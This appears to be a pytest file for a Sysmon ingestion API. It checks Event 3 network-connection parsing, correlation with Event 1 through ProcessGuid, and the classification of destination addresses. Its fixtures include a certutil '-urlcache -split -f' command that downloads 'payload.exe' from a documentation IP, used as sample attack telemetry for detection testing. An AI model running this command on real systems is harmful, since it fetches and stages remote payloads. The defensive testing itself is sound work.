"""P2 Slice-2 · Sysmon Event 3 (Network Connect) — focused tests.

Owner-locked contract from ADR-0010r:
  1. Event 3 alone → network evidence records, empty MITRE list (no
     verdict from destination alone), destination_class classified.
  2. Event 1 + Event 3 batched with shared ProcessGuid → Event 3's
     `correlated_with` points at the Event 1 evidence_ref.
  3. Duplicate Event 3 (replayed with identical fields) → identical
     evidence_ref (determinism).
  4. External vs internal destination classification.
  5. Unsupported Event ID (Event 5 process terminate) → 422.
  6. Missing optional fields don't crash + no fabrication.
  7. Malformed XML → 400 malformed_xml.
  8. Live end-to-end evidence chain: certutil Event 1 + external
     Event 3 → authoritative MITRE T1105/T1218 present from the
     Event-1 branch AND network destination surfaced separately
     without auto-labelling.
"""
from __future__ import annotations
import sys
from pathlib import Path

import pytest

_BACKEND = Path(__file__).resolve().parents[3]
if str(_BACKEND) not in sys.path:
    sys.path.insert(0, str(_BACKEND))

from fastapi.testclient import TestClient   # noqa: E402
from server import app                       # noqa: E402
from deps import get_current_user            # noqa: E402


@pytest.fixture
def client():
    async def _fake_user():
        return {"email": "test@nivxray.com", "role": "admin"}
    app.dependency_overrides[get_current_user] = _fake_user
    try:
        yield TestClient(app)
    finally:
        app.dependency_overrides.pop(get_current_user, None)


# ---------------------------------------------------------------------------
# XML builders
# ---------------------------------------------------------------------------
def _dat(name, val):
    return f"<Data Name='{name}'>{val}</Data>" if val else ""


def _event1(*, image, cmdline, proc_guid, pid="4242",
             parent_image="C:\\Windows\\explorer.exe", parent_pid="1024",
             parent_guid="{aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa}",
             hashes="", user="CONTOSO\\alice",
             time="2026-08-12T09:00:00Z"):
    return f"""<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
  <System><EventID>1</EventID><TimeCreated SystemTime='{time}' />
    <Computer>WKS-04</Computer></System>
  <EventData>
    {_dat("UtcTime", time)}
    {_dat("ProcessGuid", proc_guid)}
    {_dat("ProcessId", pid)}
    {_dat("Image", image)}
    {_dat("CommandLine", cmdline)}
    {_dat("User", user)}
    {_dat("LogonId", "0x3E7")}
    {_dat("IntegrityLevel", "Medium")}
    {_dat("Hashes", hashes)}
    {_dat("ParentProcessGuid", parent_guid)}
    {_dat("ParentImage", parent_image)}
    {_dat("ParentProcessId", parent_pid)}
  </EventData>
</Event>"""


def _event3(*, image, proc_guid, pid="4242",
             protocol="tcp", initiated="true",
             src_ip="10.0.0.42", src_port="49152",
             dst_ip="198.51.100.20", dst_port="80",
             dst_host="malicious.example.test",
             user="CONTOSO\\alice",
             time="2026-08-12T09:00:01Z"):
    return f"""<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
  <System><EventID>3</EventID><TimeCreated SystemTime='{time}' />
    <Computer>WKS-04</Computer></System>
  <EventData>
    {_dat("UtcTime", time)}
    {_dat("ProcessGuid", proc_guid)}
    {_dat("ProcessId", pid)}
    {_dat("Image", image)}
    {_dat("User", user)}
    {_dat("Protocol", protocol)}
    {_dat("Initiated", initiated)}
    {_dat("SourceIsIpv6", "false")}
    {_dat("SourceIp", src_ip)}
    {_dat("SourcePort", src_port)}
    {_dat("DestinationIsIpv6", "false")}
    {_dat("DestinationIp", dst_ip)}
    {_dat("DestinationPort", dst_port)}
    {_dat("DestinationHostname", dst_host)}
  </EventData>
</Event>"""


def _wrap(*events):
    return "<Events>" + "".join(events) + "</Events>"


def _post(client, xml):
    return client.post("/api/behavioral/sysmon", json={"xml": xml})


# ---------------------------------------------------------------------------
# 1 · Event 3 only — network evidence populated, no auto-verdict
# ---------------------------------------------------------------------------
def test_event3_only_emits_network_evidence(client):
    xml = _event3(image="C:\\Windows\\System32\\certutil.exe",
                   proc_guid="{11111111-1111-1111-1111-111111111111}",
                   dst_ip="198.51.100.20")
    r = _post(client, xml)
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["event_counts_by_id"] == {"eid1": 0, "eid3": 1}
    # Event 3 does NOT feed the authoritative MITRE surface — no
    # techniques should appear from network destination alone.
    assert body["mitre_technique_ids"] == []
    # But the network evidence is exposed.
    conns = body["network_evidence"]["connections"]
    assert len(conns) == 1
    c = conns[0]
    assert c["destination_ip"] == "198.51.100.20"
    assert c["destination_port"] == "80"
    assert c["destination_class"] == "external"
    assert c["protocol"] == "tcp"
    assert c["initiated"] is True
    # No prior Event 1 → correlated_with is null.
    assert c["correlated_with_process_create"] is None
    # Evidence records include network.destination_ip / hostname / etc.
    fields = {rec["field"] for rec in body["evidence"]}
    assert "network.destination_ip" in fields
    assert "network.destination_hostname" in fields
    assert "network.protocol" in fields
    # Every network evidence record carries the destination_class flag.
    for rec in body["evidence"]:
        if rec["source"] == "sysmon.eid3":
            assert rec["network_destination_class"] == "external"


# ---------------------------------------------------------------------------
# 2 · Event 1 + Event 3 batched → ProcessGuid correlation
# ---------------------------------------------------------------------------
def test_event3_correlated_with_event1_via_process_guid(client):
    guid = "{22222222-2222-2222-2222-222222222222}"
    e1 = _event1(
        image="C:\\Windows\\System32\\certutil.exe",
        cmdline=("certutil.exe -urlcache -split -f "
                  "http://198.51.100.20/payload.exe C:\\Users\\Public\\upd.exe"),
        proc_guid=guid,
        hashes="SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    )
    e3 = _event3(
        image="C:\\Windows\\System32\\certutil.exe",
        proc_guid=guid,
        dst_ip="198.51.100.20", dst_port="80",
        dst_host="dropper.example.test",
    )
    xml = _wrap(e1, e3)
    r = _post(client, xml)
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["event_counts_by_id"] == {"eid1": 1, "eid3": 1}
    conns = body["network_evidence"]["connections"]
    assert conns[0]["correlated_with_process_create"] is not None
    # Correlation index keyed by ProcessGuid.
    corrs = body["network_evidence"]["correlations_by_process_guid"]
    assert guid in corrs
    assert corrs[guid]["process_image"].endswith("certutil.exe")
    # Event 3 evidence records carry `correlated_with`.
    e3_records = [r for r in body["evidence"] if r["source"] == "sysmon.eid3"]
    assert e3_records, "Event 3 evidence missing"
    for rec in e3_records:
        assert "correlated_with" in rec
        assert rec["correlated_with"]["process_guid"] == guid
        assert rec["correlated_with"]["process_create_evidence_ref"]
    # Authoritative MITRE still fires from the Event 1 command line.
    ids = set(body["mitre_technique_ids"])
    assert "T1105" in ids and "T1218" in ids


# ---------------------------------------------------------------------------
# 3 · Determinism — replaying identical events → identical evidence_refs
# ---------------------------------------------------------------------------
def test_event3_evidence_ref_deterministic(client):
    guid = "{33333333-3333-3333-3333-333333333333}"
    xml = _event3(image="C:\\Windows\\System32\\svchost.exe",
                   proc_guid=guid, dst_ip="203.0.113.7")
    r1 = _post(client, xml)
    r2 = _post(client, xml)
    assert r1.status_code == 200 and r2.status_code == 200
    refs1 = [rec["evidence_ref"] for rec in r1.json()["evidence"]]
    refs2 = [rec["evidence_ref"] for rec in r2.json()["evidence"]]
    assert refs1 == refs2, "evidence_refs must be deterministic"


# ---------------------------------------------------------------------------
# 4 · Destination classification — external vs rfc1918 vs loopback
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("ip,expected_class", [
    ("198.51.100.20", "external"),
    ("10.0.0.5",      "rfc1918"),
    ("172.16.0.1",    "rfc1918"),
    ("192.168.1.1",   "rfc1918"),
    ("127.0.0.1",     "loopback"),
    ("169.254.1.1",   "linklocal"),
    ("::1",           "loopback"),
    ("2001:db8::1",   "external"),
])
def test_destination_classification(client, ip, expected_class):
    xml = _event3(image="C:\\Windows\\System32\\svchost.exe",
                   proc_guid="{44444444-4444-4444-4444-444444444444}",
                   dst_ip=ip)
    r = _post(client, xml)
    assert r.status_code == 200, r.text
    assert r.json()["network_evidence"]["connections"][0]["destination_class"] \
            == expected_class


# ---------------------------------------------------------------------------
# 5 · Unsupported EventID (5 · process terminate) → 422
# ---------------------------------------------------------------------------
def test_event5_still_rejected(client):
    xml = ("<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
           "<System><EventID>5</EventID></System>"
           "<EventData></EventData></Event>")
    r = _post(client, xml)
    assert r.status_code == 422
    assert r.json()["detail"]["error"] == "unsupported_event_id"


# ---------------------------------------------------------------------------
# 6 · Missing optional Event-3 fields → no fabrication, no crash
# ---------------------------------------------------------------------------
def test_event3_missing_optional_fields(client):
    xml = _event3(image="", proc_guid="", pid="", protocol="tcp",
                   initiated="false", src_ip="", src_port="",
                   dst_ip="8.8.8.8", dst_port="53",
                   dst_host="", user="")
    r = _post(client, xml)
    assert r.status_code == 200, r.text
    body = r.json()
    fields = {rec["field"] for rec in body["evidence"]}
    assert "network.destination_ip" in fields
    # Absent fields simply don't appear.
    assert "process.image" not in fields
    assert "process.guid" not in fields
    assert "network.destination_hostname" not in fields


# ---------------------------------------------------------------------------
# 7 · Malformed XML → 400
# ---------------------------------------------------------------------------
def test_malformed_xml_rejected(client):
    r = _post(client, "<Event><System><EventID>3</System>")
    assert r.status_code == 400
    assert r.json()["detail"]["error"] == "malformed_xml"


# ---------------------------------------------------------------------------
# 8 · End-to-end evidence chain — Cruise-Missile-shaped
# ---------------------------------------------------------------------------
def test_end_to_end_chain_process_exec_network(client):
    """Sysmon Event 1 (explorer.exe → certutil.exe) followed by Sysmon
    Event 3 (certutil.exe → 198.51.100.20:80). The response MUST
    reveal:
      · authoritative MITRE T1105/T1140/T1218 from Event 1 command line
      · Event 3 destination classified `external`
      · Event 3 correlated back to the Event 1 process-create via
        ProcessGuid
      · destination NOT auto-labelled malicious (no verdict field on
        network_evidence).
    """
    guid = "{55555555-5555-5555-5555-555555555555}"
    xml = _wrap(
        _event1(image="C:\\Windows\\System32\\certutil.exe",
                 cmdline=("certutil.exe -urlcache -split -f "
                          "http://198.51.100.20/payload.exe "
                          "C:\\Users\\Public\\upd.exe"),
                 proc_guid=guid,
                 hashes="MD5=D41D8CD98F00B204E9800998ECF8427E"),
        _event3(image="C:\\Windows\\System32\\certutil.exe",
                 proc_guid=guid,
                 dst_ip="198.51.100.20", dst_port="80"),
    )
    r = _post(client, xml)
    assert r.status_code == 200, r.text
    body = r.json()

    # MITRE surface (authoritative, from Event 1 command line)
    ids = set(body["mitre_technique_ids"])
    assert {"T1105", "T1140", "T1218"} <= ids, ids

    # Network evidence exposed but never wearing a verdict
    conn = body["network_evidence"]["connections"][0]
    assert conn["destination_ip"] == "198.51.100.20"
    assert conn["destination_class"] == "external"
    assert conn["correlated_with_process_create"] is not None
    assert "verdict" not in conn
    assert "malicious" not in conn

    # Response envelope carries the explicit non-verdict limitation
    lim = body["limitations"]
    assert "destination_reputation" in lim
    assert "never labels" in lim["destination_reputation"].lower() \
            or "evidence only" in lim["destination_reputation"].lower()

    # Cruise-Missile chain reconstruction is possible from the response:
    # Event 1 evidence_ref  →  Event 3 correlation ref
    e1_refs = {r["evidence_ref"] for r in body["evidence"]
                if r["source"] == "sysmon.eid1"}
    e3_ref = conn["correlated_with_process_create"]
    assert e3_ref in e1_refs, \
        "Event 3 correlation must point at a real Event 1 evidence_ref"
